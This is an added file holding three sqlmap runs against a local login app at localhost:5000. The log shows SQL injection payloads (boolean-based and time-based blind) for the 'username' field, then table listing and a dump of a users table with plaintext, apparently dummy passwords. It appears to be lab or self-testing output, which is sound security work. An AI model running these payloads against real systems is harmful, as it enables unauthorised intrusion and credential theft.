@@ -1,0 +1,190 @@
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.8.4#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:19:40 /2026-07-31/
+
+[20:19:40] [INFO] flushing session file
+[20:19:40] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://localhost:5000/dashboard'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+you have not declared cookie(s), while server wants to set its own ('session=eyJ1c2VyIjo...ICAHnOl7OI'). Do you want to use those [Y/n] Y
+[20:19:40] [INFO] checking if the target is protected by some kind of WAF/IPS
+[20:19:40] [INFO] testing if the target URL content is stable
+[20:19:41] [WARNING] POST parameter 'username' does not appear to be dynamic
+[20:19:41] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'SQLite')
+[20:19:41] [INFO] testing for SQL injection on POST parameter 'username'
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] Y
+[20:19:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[20:19:41] [WARNING] reflective value(s) found and filtering out
+[20:19:41] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[20:19:41] [INFO] testing 'Generic inline queries'
+[20:19:41] [INFO] testing 'SQLite inline queries'
+[20:19:41] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[20:19:41] [WARNING] time-based comparison requires larger statistical model, please wait..................... (done)
+[20:19:42] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
+[20:19:42] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[20:19:45] [INFO] POST parameter 'username' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
+[20:19:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[20:19:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[20:19:45] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[20:19:45] [INFO] target URL appears to have 3 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[20:19:45] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[20:19:45] [INFO] target URL appears to be UNION injectable with 3 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[20:19:45] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 113 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=admin' AND 2743=2743 AND 'EBfA'='EBfA&password=admin123
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 5929=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'MSKR'='MSKR&password=admin123
+---
+[20:19:45] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[20:19:45] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 30 times
+[20:19:45] [INFO] fetched data logged to text files under '/home/lemos/.local/share/sqlmap/output/localhost'
+[20:19:45] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 20:19:45 /2026-07-31/
+
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:19:46 /2026-07-31/
+
+[20:19:46] [INFO] resuming back-end DBMS 'sqlite' 
+[20:19:46] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://localhost:5000/dashboard'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+you have not declared cookie(s), while server wants to set its own ('session=eyJ1c2VyIjo...DOzUy11PbQ'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=admin' AND 2743=2743 AND 'EBfA'='EBfA&password=admin123
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 5929=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'MSKR'='MSKR&password=admin123
+---
+[20:19:46] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[20:19:46] [INFO] fetching tables for database: 'SQLite_masterdb'
+[20:19:46] [INFO] fetching number of tables for database 'SQLite_masterdb'
+[20:19:46] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+
+[20:19:46] [INFO] retrieved: [20:19:46] [WARNING] reflective value(s) found and filtering out
+3
+
+[20:19:46] [INFO] retrieved: users
+
+[20:19:46] [INFO] retrieved: sqlite_sequence
+
+[20:19:47] [INFO] retrieved: files
+<current>
+[3 tables]
++-----------------+
+| files           |
+| sqlite_sequence |
+| users           |
++-----------------+
+
+[20:19:47] [INFO] fetched data logged to text files under '/home/lemos/.local/share/sqlmap/output/localhost'
+[20:19:47] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 20:19:47 /2026-07-31/
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.8.4#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:19:48 /2026-07-31/
+
+[20:19:48] [INFO] resuming back-end DBMS 'sqlite' 
+[20:19:48] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://localhost:5000/dashboard'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+you have not declared cookie(s), while server wants to set its own ('session=eyJ1c2VyIjo...7fLoFeiiQE'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=admin' AND 2743=2743 AND 'EBfA'='EBfA&password=admin123
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 5929=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'MSKR'='MSKR&password=admin123
+---
+[20:19:48] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[20:19:48] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+
+[20:19:48] [INFO] retrieved: [20:19:48] [WARNING] reflective value(s) found and filtering out
+CREATE TABLE users (             id INTEGER PRIMARY KEY AUTOINCREMENT,             username TEXT,             password TEXT         )
+[20:19:56] [INFO] fetching entries for table 'users'
+[20:19:56] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
+
+[20:19:56] [INFO] retrieved: 3
+
+[20:19:57] [INFO] retrieved: 1
+
+[20:19:57] [INFO] retrieved: admin123
+
+[20:19:57] [INFO] retrieved: admin
+
+[20:19:57] [INFO] retrieved: 2
+
+[20:19:57] [INFO] retrieved: 123456
+
+[20:19:58] [INFO] retrieved: ana
+
+[20:19:58] [INFO] retrieved: 3
+
+[20:19:58] [INFO] retrieved: password
+
+[20:19:59] [INFO] retrieved: pedro
+Database: <current>
+Table: users
+[3 entries]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | admin123 | admin    |
+| 2  | 123456   | ana      |
+| 3  | password | pedro    |
++----+----------+----------+
+
+[20:19:59] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/lemos/.local/share/sqlmap/output/localhost/dump/SQLite_masterdb/users.csv'
+[20:19:59] [INFO] fetched data logged to text files under '/home/lemos/.local/share/sqlmap/output/localhost'
+[20:19:59] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 20:19:59 /2026-07-31/
+
